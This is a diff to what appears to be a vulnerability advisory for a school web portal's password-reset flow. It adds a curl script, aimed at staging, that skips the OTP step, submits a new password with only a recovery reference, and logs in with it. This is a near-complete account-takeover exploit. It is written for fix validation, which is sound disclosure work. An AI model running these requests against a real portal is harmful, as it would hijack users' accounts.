@@ -80,6 +80,75 @@ Run this sequence only against a UWCSEA-approved staging copy or a disposable cl
 
 The key comparison is between step 5 and step 7: the reset page and reset operation accept a valid recovery reference without checking that the corresponding OTP challenge was completed.
 
+### Staging request templates
+
+The following templates show the request shape used for staging validation. Replace every angle-bracket value with a synthetic staging value. Do not replace `STAGING_BASE_URL` with the public UWCSEA host in a public test, and do not include real tokens or cookies in an issue comment.
+
+```bash
+STAGING_BASE_URL="http://127.0.0.1/cims"
+COOKIE_JAR="cims-lab.cookies"
+USERNAME="lab-user-a"
+NEW_PASSWORD="<SYNTHETIC_PASSWORD_16_OR_MORE_CHARS>"
+
+# 1. Load the recovery page and keep the staging-only session state.
+curl -sS -c "$COOKIE_JAR" \
+  "$STAGING_BASE_URL/Account/ForgotPassword" \
+  -o forgot-password.html
+
+# Extract the anti-forgery value only inside the staging test harness.
+# Do not print or publish the value.
+CSRF="<STAGING_CSRF_FROM_FORGOT_PASSWORD_FORM>"
+
+# 2. Start recovery. The vulnerable behavior returns a recovery reference
+# and points to the OTP step.
+curl -sS -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
+  -H 'X-Requested-With: XMLHttpRequest' \
+  --data-urlencode "__RequestVerificationToken=$CSRF" \
+  --data-urlencode "Username=$USERNAME" \
+  "$STAGING_BASE_URL/Account/ForgotPassword"
+
+# Expected vulnerable marker (redacted):
+# {"Redirect":"...ForgotPasswordOtp?...accessKey=<REDACTED>"}
+
+# 3. Skip OTP and open the final reset page directly.
+RECOVERY_REFERENCE="<STAGING_RECOVERY_REFERENCE>"
+curl -sS -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
+  "$STAGING_BASE_URL/Account/ResetPassword?accessKey=$RECOVERY_REFERENCE" \
+  -o reset-password.html
+
+# Expected vulnerable marker: the reset form is rendered before OTP success.
+
+# 4. Submit the final reset form without an OTP result.
+RESET_CSRF="<STAGING_CSRF_FROM_RESET_FORM>"
+curl -sS -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
+  -H 'X-Requested-With: XMLHttpRequest' \
+  --data-urlencode "__RequestVerificationToken=$RESET_CSRF" \
+  --data-urlencode "Username=$USERNAME" \
+  --data-urlencode "AccessKey=$RECOVERY_REFERENCE" \
+  --data-urlencode "Password=$NEW_PASSWORD" \
+  --data-urlencode "ConfirmPassword=$NEW_PASSWORD" \
+  "$STAGING_BASE_URL/Account/ResetPassword"
+
+# Expected vulnerable marker: a successful reset redirect/result.
+
+# 5. Verify only with the synthetic account through the normal login flow.
+LOGIN_CSRF="<STAGING_CSRF_FROM_LOGIN_FORM>"
+curl -sS -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
+  -H 'X-Requested-With: XMLHttpRequest' \
+  --data-urlencode "__RequestVerificationToken=$LOGIN_CSRF" \
+  --data-urlencode "Username=$USERNAME" \
+  --data-urlencode "Password=$NEW_PASSWORD" \
+  --data-urlencode 'Fingerprint=' \
+  --data-urlencode 'Base64=' \
+  --data-urlencode 'ReturnUrl=' \
+  "$STAGING_BASE_URL/Account/Login"
+
+# Expected vulnerable marker: the login flow advances to its post-login step
+# and creates a staging-only authenticated session.
+```
+
+The command sequence is a staging template, not a production exploit. The test is complete when the same sequence is rejected after the fix unless the OTP-success state is present.
+
 
 ### Impact
 
